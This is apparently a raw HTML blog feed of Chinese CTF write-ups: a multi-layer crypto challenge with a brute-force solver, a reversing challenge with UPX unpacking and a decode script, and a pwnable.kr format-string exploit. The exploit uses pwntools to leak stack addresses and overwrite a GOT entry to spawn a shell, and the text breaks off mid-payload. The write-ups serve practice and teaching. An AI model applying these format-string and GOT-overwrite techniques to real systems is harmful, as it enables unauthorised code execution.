binascii</span><br><span class="line">import collections</span><br><span class="line">import hashlib</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">from Crypto.Util import number</span><br><span class="line"></span><br><span class="line">p = number.getPrime(1024)</span><br><span class="line">q = number.getPrime(1024)</span><br><span class="line">n = p * q</span><br><span class="line">e = number.getPrime(24)</span><br><span class="line">print(&apos;RSA(n=0x%x, e=0x%x)&apos; % (n, e))</span><br><span class="line"></span><br><span class="line">def rsa_encrypt(x):</span><br><span class="line">    v = number.bytes_to_long(x)</span><br><span class="line">    return pow(v, e, n)</span><br><span class="line"></span><br><span class="line">def xor(a, b):</span><br><span class="line">    return bytes(i ^ j for i, j in zip(a, b))</span><br><span class="line"></span><br><span class="line">flag = open(&apos;flag&apos;, &apos;rb&apos;).read()</span><br><span class="line"></span><br><span class="line">assert flag.startswith(b&apos;FLAG&#123;&apos;) and flag.endswith(b&apos;&#125;\n&apos;)</span><br><span class="line">print(hashlib.sha256(flag).hexdigest())</span><br><span class="line"></span><br><span class="line">def layer1(data):</span><br><span class="line">    data = data.decode(&apos;ascii&apos;)</span><br><span class="line"></span><br><span class="line">    s = string.ascii_uppercase</span><br><span class="line">    t = list(s)</span><br><span class="line">    random.shuffle(t)</span><br><span class="line">    t = &apos;&apos;.join(t)</span><br><span class="line"></span><br><span class="line">    print(collections.Counter(data))</span><br><span class="line"></span><br><span class="line">    return data.translate(str.maketrans(s, t))</span><br><span class="line"></span><br><span class="line">def layer2(data):</span><br><span class="line">    return bytes([ord(b) * 17 % 251 for b in data])</span><br><span class="line"></span><br><span class="line">def layer3(data):</span><br><span class="line">    output = []</span><br><span class="line">    key = number.bytes_to_long(os.urandom(128))</span><br><span class="line"></span><br><span class="line">    for i in data:</span><br><span class="line">        key = (key * 0xc8763 + 9487) % 0x10000000000000000</span><br><span class="line">        output.append((i ^ key) &amp; 0xff)</span><br><span class="line">    </span><br><span class="line">    return bytes(output)</span><br><span class="line"></span><br><span class="line">def layer4(data):</span><br><span class="line">    iv = os.urandom(256)</span><br><span class="line">    output = iv</span><br><span class="line"></span><br><span class="line">    hexencoded = binascii.hexlify(data)</span><br><span class="line">    length_target = (len(hexencoded) + 3) // 4</span><br><span class="line">    padded = hexencoded.ljust(length_target * 4, b&apos;f&apos;)</span><br><span class="line"></span><br><span class="line">    for i in range(0, len(padded), 4):</span><br><span class="line">        r = rsa_encrypt(padded[i:i+4])</span><br><span class="line">        block = binascii.unhexlify(&apos;%.512x&apos; % r)</span><br><span class="line">        output += xor(output[-256:], block)</span><br><span class="line"></span><br><span class="line">    return base64.b64encode(output)</span><br><span class="line"></span><br><span class="line">flag = layer1(flag) #tihuan</span><br><span class="line">print(&quot;layer1 -&gt; &#123;&#125;&quot;.format(flag))</span><br><span class="line">flag = layer2(flag)</span><br><span class="line">print(&quot;layer2 -&gt; &#123;&#125;&quot;.format(flag))</span><br><span class="line"></span><br><span class="line">flag = layer3(flag)</span><br><span class="line">print(&quot;layer3 -&gt; &#123;&#125;&quot;.format(flag))</span><br><span class="line"></span><br><span class="line">flag = layer4(flag)</span><br><span class="line">print(&quot;layer4 -&gt; &#123;&#125;&quot;.format(flag))</span><br><span class="line"></span><br><span class="line">print(flag.decode(&apos;ascii&apos;))</span><br></pre></td></tr></table></figure><h3 id="layer4"><a href="#layer4" class="headerlink" title="layer4"></a>layer4</h3><p>这个函数的流程大致是先生成一个长度为256的随机字符串<code>output</code>，<code>padded</code>就是<code>layer3</code>生成的密文。</p><p>循环的功能是将<code>padded</code>的每四个字符进行rsa加密得到<code>block</code>，再将<code>output</code>的后256位字符与<code>block</code>进行异或，并将结果接在<code>output</code>后面。</p><p>我们可以在<code>encrypted</code>文件中得到最终output的base64编码，将其解码之后每256位分成一组，可以得到<strong>41</strong>组长度为256的字符串。按逆向的思想，以第二组为例，它是循环中第一次rsa加密的密文<code>block</code>和初始<code>output</code>进行异或的结果，由于异或的特性，我们把第二组和第一组再进行异或便可以得到第一次rsa加密的密文<code>block</code>。以此类推，最终我们可以得到全部rsa加密的密文。</p><p>接下来就是如何解密这个rsa，从文件<code>encrypted</code>中我们可以得到<code>n</code>和<code>e</code>，但由于<code>n</code>很大，无法分解，所以无法正向解出。仔细分析可以知道，每次rsa加密的明文长度为4，并且均是16进制的串，例如<code>&quot;ffff&quot;</code>，范围不大，直接爆破即可。</p><h3 id="layer3"><a href="#layer3" class="headerlink" title="layer3"></a>layer3</h3><p>这个函数一开始看的时候恐怖的一批，一个长度为128的字符串转为十进制数后当做<code>key</code>来与明文<code>data</code>异或。。。</p><p>但后来仔细想想，不管<code>key</code>多大，和<code>i</code>异或之后都要模上0xff，那<code>key</code>不就相当于是在<code>0-256</code>之间吗。其实质是因为异或的过程中只有key的低八位在进行运算，其高位和0异或不变，之后模0xff就相当于其高位根本没起作用。</p><p>下面这张图验证了我的想法</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fufa7wwo3jj30qz0j5jtk.jpg" alt="img"></p><p>那么key的范围确定在<code>0-256</code>之间了，怎样才算正确的key呢？接着往layer2看</p><h3 id="layer2"><a href="#layer2" class="headerlink" title="layer2"></a>layer2</h3><p>这个函数的加密也很有意思，源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def layer2(data):</span><br><span class="line">    return bytes([ord(b) * 17 % 251 for b in data])</span><br></pre></td></tr></table></figure><p>解决方法如下</p><blockquote><p>n = 251</p><p>e = 17</p><p>d = invert(e,n) = 192</p><p>cipher = plaintext * e (mod n)</p><p>plaintext = cipher * d(mod n)</p></blockquote><p>原理(反证法 by唐老板)</p><blockquote><p>证：m = c*d (mod n)</p><p>由于c = m * e (mod n)</p><p>==&gt; m = { (plain <em>e) mod n }</em> d mod n</p><p>==&gt; m = m<em>e</em>d mod n</p><p>由于d*e ≡ 1(mod n)</p><p>故m = c*d (mod n) 得证</p></blockquote><p>举个例子</p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fufb5d6xi6j30co0aj748.jpg" alt="img"></p><p>那么layer3和layer2都有解决办法了，直接一起解得到layer1的密文，通过观察结果是否均为<strong>可见字符</strong>判断layer3的key是否正确。</p><h3 id="layer1"><a href="#layer1" class="headerlink" title="layer1"></a>layer1</h3><p>替换加密，直接<a href="https://quipqiup.com/" target="_blank" rel="noopener">在线网站</a>解一波</p><h3 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line">#https://quipqiup.com/</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import collections</span><br><span class="line">import hashlib</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line">from libnum import s2n,n2s</span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util import number</span><br><span class="line"></span><br><span class="line">cipher = open(&apos;encrypted&apos;,&apos;rb&apos;).read()</span><br><span class="line">n=0x80dd2dec6684d43bd8f2115c88717386b2053bdb554a12d52840380af48088b7f1f71c3d3840ef4615af318bbe261d2d2d90616c0d2dcb6414e05c706f2b6d700ed98128048a2b79f57d2c6476add369ec96fb0fed936506d9aee4da5d36aaa97f117b082924c0638923e4367f250cc6cd23918702d98c5359bbb6bad2bef741c65362ad40355fd2edb35248256413d0ee576e7a351f17b9a5a3a7eebbbb2b22f27c342ef6dcaf1396085a105cf5e8b9bbf80e002053347fd9db6e83dc63599b1e1e5a81f7f2e4e2473bc2d14d040c9c6e6f62b9027853c7550a10df49c3a786962c9e9d5b95551a95077d0bd354b88ef31c5625e21edf98f721504f73e1b867</span><br><span class="line">e=0xcf98d5</span><br><span class="line"></span><br><span class="line">flag_counter = &#123;&apos; &apos;: 14, &apos;O&apos;: 6, &apos;A&apos;: 5, &apos;U&apos;: 4, &apos;I&apos;: 4, &apos;T&apos;: 4, &apos;N&apos;: 3, &apos;D&apos;: 3, &apos;E&apos;: 3, &apos;L&apos;: 3, &apos;H&apos;: 3, &apos;Y&apos;: 3, &apos;R&apos;: 3, &apos;G&apos;: 2, &apos;C&apos;: 2, &apos;F&apos;: 2, &apos;W&apos;: 2, &apos;.&apos;: 1, &apos;&#125;&apos;: 1, &apos;B&apos;: 1, &apos;V&apos;: 1, &apos;Q&apos;: 1, &apos;P&apos;: 1, &apos;X&apos;: 1, &apos;M&apos;: 1, &apos;\n&apos;: 1, &apos;&#123;&apos;: 1, &apos;K&apos;: 1, &apos;J&apos;: 1, &apos;S&apos;: 1, &apos;Z&apos;: 1&#125;</span><br><span class="line"></span><br><span class="line">flag = &quot;FLAG&#123;&quot;</span><br><span class="line"></span><br><span class="line">def xor(a, b):</span><br><span class="line">    return s2n(&apos;&apos;.join([chr(ord(i) ^ ord(j)) for i, j in zip(a, b)]))</span><br><span class="line"></span><br><span class="line">def rsa_encrypt(m):</span><br><span class="line"></span><br><span class="line">    return pow(s2n(m),e,n)</span><br><span class="line"></span><br><span class="line">def burp_m(c):</span><br><span class="line">    </span><br><span class="line">    zidian = &quot;0123456789abcdef&quot;</span><br><span class="line"></span><br><span class="line">    for i in zidian:</span><br><span class="line">        for j in zidian:</span><br><span class="line">            for k in zidian:</span><br><span class="line">                for l in zidian:</span><br><span class="line">                    m1 = i+j+k+l</span><br><span class="line">                    if rsa_encrypt(m1) == c:</span><br><span class="line">                        return m1</span><br><span class="line">    return &apos;false&apos;</span><br><span class="line"></span><br><span class="line">def decode_layer4():</span><br><span class="line">    </span><br><span class="line">    cipher_layer4 = &quot;&quot;</span><br><span class="line">    for i,j in enumerate(cipher):</span><br><span class="line">        if cipher[i:i+4] == &quot;eH/V&quot;:</span><br><span class="line">            cipher_layer4 = cipher[i:]</span><br><span class="line">            break</span><br><span class="line">    #print cipher_layer4</span><br><span class="line">    cipher_layer4 = base64.b64decode(cipher_layer4)</span><br><span class="line">    print type(cipher_layer4),len(cipher_layer4)</span><br><span class="line">    </span><br><span class="line">    cipher4 = []</span><br><span class="line">    for i in range(41):</span><br><span class="line">        c = &apos;&apos;</span><br><span class="line">        for j in range(256):</span><br><span class="line">            c += cipher_layer4[i*256+j]</span><br><span class="line">        cipher4.append(c)</span><br><span class="line">    #print len(cipher4),cipher4</span><br><span class="line">    </span><br><span class="line">    cipher3 = &quot;&quot;</span><br><span class="line">    for i in range(1,41):</span><br><span class="line">        a = xor(cipher4[i-1],cipher4[i])</span><br><span class="line">        print &quot;Try &#123;&#125; -&gt; &#123;&#125;&quot;.format(i,a)</span><br><span class="line">        b = burp_m(a)</span><br><span class="line">        if b != &apos;false&apos;:</span><br><span class="line">            print b</span><br><span class="line">            cipher3 += b</span><br><span class="line">    print cipher3</span><br><span class="line"></span><br><span class="line">def layer3_and_layer2(text,key):</span><br><span class="line"></span><br><span class="line">    cipher_3= &quot;&quot;</span><br><span class="line">    for i in text:</span><br><span class="line">        key = (key * 0xc8763 + 9487)&amp;0xff</span><br><span class="line">        cipher_3 += chr(ord(i)^key)</span><br><span class="line"></span><br><span class="line">    cipher_2 = &quot;&quot;</span><br><span class="line">    key_layer2 = gmpy2.invert(17,251)</span><br><span class="line">    print &quot;key_layer2 -&gt; &#123;&#125;&quot;.format(key_layer2)</span><br><span class="line">    for i in cipher_3:</span><br><span class="line">        cipher_2 += chr( (ord(i)*192) % 251 )</span><br><span class="line">    return cipher_2 </span><br><span class="line"></span><br><span class="line">def decode_layer3_layer2(cipher3):</span><br><span class="line"></span><br><span class="line">    cipher1 = []</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">num = 0</span><br><span class="line">flag_str = &quot;&quot;</span><br><span class="line">print len(flag_counter)</span><br><span class="line">for i,j in flag_counter.items():</span><br><span class="line">num += j</span><br><span class="line">flag_str += i</span><br><span class="line">flag_str = &quot;&quot;.join((lambda x:(x.sort(),x)[1])(list(flag_str)))</span><br><span class="line"></span><br><span class="line">print &quot;flag_len -&gt; &#123;&#125;&quot;.format(num)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    for i in range(256):</span><br><span class="line">        temp = layer3_and_layer2(cipher3,i)</span><br><span class="line">        cipher1.append(temp)</span><br><span class="line">    print cipher1</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    </span><br><span class="line">    print rsa_encrypt(&apos;1234&apos;)</span><br><span class="line">#decode_layer4()</span><br><span class="line">    print &quot;layer4 clear!&quot;</span><br><span class="line">    cipher3 = binascii.unhexlify(&quot;58cf2de2cf8e72d8c28b1925e6962d51a3630af38a84923462d397d60665995fa1313e4444890cba0e201a43fa9ee2877c115e64a4e9116362fd4c34c68fc50c6edca071d795ee295ece1d3fd46efd0d&quot;)</span><br><span class="line">    decode_layer3_layer2(cipher3)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Points: 150&lt;/p&gt;
&lt;p&gt;Solves: 6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一道多重加密的crypto，很好玩。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Crypto" scheme="https://l1b0.fun/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯-7月月赛-Reverse-Youngter-drive</title>
    <link href="https://l1b0.fun/2018/08/18/%E5%AE%89%E6%81%92%E6%9D%AF-7%E6%9C%88%E6%9C%88%E8%B5%9B-Reverse-Youngter-drive/"/>
    <id>https://l1b0.fun/2018/08/18/安恒杯-7月月赛-Reverse-Youngter-drive/</id>
    <published>2018-08-18T12:28:00.000Z</published>
    <updated>2019-09-17T12:29:25.434Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>我先吐槽一句，这题真是巨坑==</p></blockquote><h3 id="Step1-脱UPX"><a href="#Step1-脱UPX" class="headerlink" title="Step1: 脱UPX"></a>Step1: 脱UPX</h3><p>首先file一下，发现有upx壳，这是第一关。</p><p>二话不说<code>upx -d Youngter-drive.exe</code>脱掉。</p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fubbwetbapj30s602mmxx.jpg" alt="img"></p><a id="more"></a><h3 id="Step2-修复F5"><a href="#Step2-修复F5" class="headerlink" title="Step2: 修复F5"></a>Step2: 修复F5</h3><p>然后拖进IDA看源码，主函数如下</p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fubc0e29l3j30v90biq4n.jpg" alt="img"></p><p>然后这点一点那点一点发现<code>StartAddress</code>里有猫腻，跟进去发现关键函数<code>sub_411940</code>无法F5，提示<code>positive sp value has been found</code></p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fubc47saiej30bf04rglo.jpg" alt="img"></p><p>出现这个报错的原因是堆栈不平衡，我们可以通过修改<code>sp value</code>使堆栈平衡。</p><blockquote><p>IDA中Options-&gt;General选中Stack pointer可以查看堆栈指针</p></blockquote><p>可以看到，就是因为<code>411A04</code>处堆栈指针为<code>-4</code>导致无法F5，<code>Alt+K</code>可以修改此处的<code>sp value</code></p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fubch1qlyfj30tp07w3zt.jpg" alt="img"></p><p>修改之后如下图，此时堆栈平衡，可以F5。</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fubcj8el7mj30v507k3zp.jpg" alt="img"></p><p>然后就可以看到关键函数<code>sub_411940</code>的源码</p><p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fubcl4n5kej30my0codh2.jpg" alt="img"></p><h3 id="Step3-逆向解密"><a href="#Step3-逆向解密" class="headerlink" title="Step3: 逆向解密"></a>Step3: 逆向解密</h3><p>这个函数相当于一个加密，逻辑很简单，先判断是否是<strong>字母</strong>，如果不是直接终止程序；之后判断如果是<strong>大写字母</strong>则进行替换，<strong>小写字母</strong>进行另一种替换。</p><p>加密完成之后和字符串off_418004进行明文比较，相等即正确。</p><p>看到这里我兴奋的一批，直接写脚本跑一发，结果发现交了贼多次都不对。。。</p><p>后来注意到main函数写了一个多线程(双线程)，然而自己也还不会写多线程，于是疯狂百度函数的作用，才有了上面第二张图主函数的简单注释。</p><p>仔细分析会注意到，线程hObject是进行加密，线程v1就是减个下标dword_418008。而dword_418008初始值为0x1d即29，这相当于如果dword_418008是奇数，进行加密，如果是偶数，密文和明文相同。</p><p>之后还有个坑，下标从29开始的话意味着输入长度有30，而在函数<code>sub_411880</code>进行check时只比较前29个字符，相等即正确。那么我们只需还原明文的前29位，加上一个任意字母即可。</p><h3 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">off_418000 = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\0&quot;</span><br><span class="line"></span><br><span class="line">off_418004 = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;</span><br><span class="line">print len(off_418004),len(off_418000)</span><br><span class="line"></span><br><span class="line">def decode(a):</span><br><span class="line"></span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    for i in range(len(a)):</span><br><span class="line">        if i %2 == 0:</span><br><span class="line">            flag += a[i]</span><br><span class="line">            continue</span><br><span class="line">        for j,k in enumerate(off_418000):</span><br><span class="line">            if a[i] == k:</span><br><span class="line">                print i,j</span><br><span class="line">                if chr(j+38).isupper():</span><br><span class="line">                    flag += chr(j+38)</span><br><span class="line">                else:</span><br><span class="line">                    flag += chr(j+96)</span><br><span class="line">                break </span><br><span class="line">    </span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line">def encode(flag):</span><br><span class="line">    </span><br><span class="line">    cipher = &quot;&quot;</span><br><span class="line">    for j,i in enumerate(flag):</span><br><span class="line">        if j %2 == 0:</span><br><span class="line">            cipher += i</span><br><span class="line">            continue</span><br><span class="line">        if ord(i) &lt; ord(&apos;a&apos;) or ord(i) &gt; ord(&apos;z&apos;):</span><br><span class="line">            cipher += off_418000[ord(i)-38]</span><br><span class="line">        else:</span><br><span class="line">            cipher += off_418000[ord(i)-96]</span><br><span class="line">    return cipher </span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    flag = off_418004</span><br><span class="line">    flag = decode(flag)</span><br><span class="line">    print flag</span><br><span class="line">    cipher = encode(flag)</span><br><span class="line"></span><br><span class="line">    print cipher == off_418004</span><br></pre></td></tr></table></figure><blockquote><p>Flag: ThisisthreadofwindowshahaIsES加一个任意字母</p><p>如：ThisisthreadofwindowshahaIsESE</p></blockquote><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li>Linux-Install-upx: <code>sudo apt-get install upx</code></li><li>ida-sp-value-error: <a href="https://stackoverflow.com/questions/10165511/ida-positive-sp-value-has-been-found-error" target="_blank" rel="noopener">https://stackoverflow.com/questions/10165511/ida-positive-sp-value-has-been-found-error</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;我先吐槽一句，这题真是巨坑==&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Step1-脱UPX&quot;&gt;&lt;a href=&quot;#Step1-脱UPX&quot; class=&quot;headerlink&quot; title=&quot;Step1: 脱UPX&quot;&gt;&lt;/a&gt;Step1: 脱UPX&lt;/h3&gt;&lt;p&gt;首先file一下，发现有upx壳，这是第一关。&lt;/p&gt;
&lt;p&gt;二话不说&lt;code&gt;upx -d Youngter-drive.exe&lt;/code&gt;脱掉。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://wx4.sinaimg.cn/mw690/0060lm7Tly1fubbwetbapj30s602mmxx.jpg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Reverse" scheme="https://l1b0.fun/tags/Reverse/"/>
    
      <category term="upx" scheme="https://l1b0.fun/tags/upx/"/>
    
      <category term="fix-f5" scheme="https://l1b0.fun/tags/fix-f5/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable-Kr-Rookiss-fsb</title>
    <link href="https://l1b0.fun/2018/08/15/Pwnable-Kr-Rookiss-fsb/"/>
    <id>https://l1b0.fun/2018/08/15/Pwnable-Kr-Rookiss-fsb/</id>
    <published>2018-08-15T12:25:04.000Z</published>
    <updated>2019-09-17T12:26:37.763Z</updated>
    
    <content type="html"><![CDATA[<h4 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h4><blockquote><p>Isn’t FSB almost obsolete in computer security?<br>Anyway, have fun with it :)</p><p>ssh <a href="mailto:fsb@pwnable.kr" target="_blank" rel="noopener">fsb@pwnable.kr</a> -p2222 (pw:guest)</p><p>On Aug 15,2018</p></blockquote><a id="more"></a><h4 id="大致分析"><a href="#大致分析" class="headerlink" title="大致分析"></a>大致分析</h4><p>明显的格式化字符串漏洞类型的题目，由于buf不在栈上，我们需要借助栈上的其他数据如ebp来作为跳板。</p><p>类似的题目还有<a href="https://l1b0.github.io/2018/08/08/Format-String-Bug-Training/" target="_blank" rel="noopener">HITCON-Training-lab9</a></p><p>题目流程大致是经过四次<code>read</code>和<code>printf</code>的fsb利用后，check输入的pw和程序随机出来的key是否相等。</p><p>我一开始想的是把key的bss段地址放到栈上，然后通过任意地址读得到key，但后来发现程序生成的key太大了，而pw的输入限制长度为10，所以不可能通过正常流程拿到权限。</p><p>那后来就覆盖sleep的got表的真实地址为<code>execve(&#39;/bin/sh&#39;)</code>，过程正好用了四次fsb。</p><blockquote><ol><li>泄露栈的esp，方便后面定位栈上其他的地址</li><li>泄露main的ebp，由于main的ebp和栈上的偏移不固定，所以需要单独泄露一次</li><li>将main的ebp覆盖为sleep的got表地址</li><li>将sleep的got表地址覆盖为<code>execve(&#39;/bin/sh&#39;)</code></li></ol></blockquote><h4 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from sys import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos; ]</span><br><span class="line"></span><br><span class="line">if argv[1] == &apos;l&apos;:</span><br><span class="line">    io = process(&apos;./fsb&apos;)</span><br><span class="line">else:</span><br><span class="line">    io = ssh(host=&apos;pwnable.kr&apos;,port=2222,user=&apos;fsb&apos;,password=&apos;guest&apos;).run(&apos;/home/fsb/fsb&apos;)</span><br><span class="line"></span><br><span class="line">def DEBUG():</span><br><span class="line"></span><br><span class="line">    gdb.attach(io,&quot;b *0x08048608\nc&quot;)</span><br><span class="line"></span><br><span class="line">def leak_esp():</span><br><span class="line"></span><br><span class="line">    payload = &quot;+%14$x+&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&apos;+&apos;)</span><br><span class="line">    esp = int(io.recvuntil(&apos;+&apos;)[:-1],16)-0x50</span><br><span class="line"></span><br><span class="line">    return esp</span><br><span class="line"></span><br><span class="line">def leak_ebp_main():</span><br><span class="line"></span><br><span class="line">    payload = &quot;+%18$x+&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&apos;+&apos;)</span><br><span class="line">    ebp_main = int(io.recvuntil(&apos;+&apos;)[:-1],16)</span><br><span class="line"></span><br><span class="line">    return ebp_main</span><br><span class="line"></span><br><span class="line">def ebp_main_to_got():</span><br><span class="line"></span><br><span class="line">    got_addr = 0x0804A008 </span><br><span class="line"></span><br><span class="line">    payload = &quot;%&#123;&#125;c%18$n&quot;.format(got_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">def sleep_to_flag(offset):</span><br><span class="line"></span><br><span class="line">    flag_addr = 0x080486AB</span><br><span class="line">    payload = 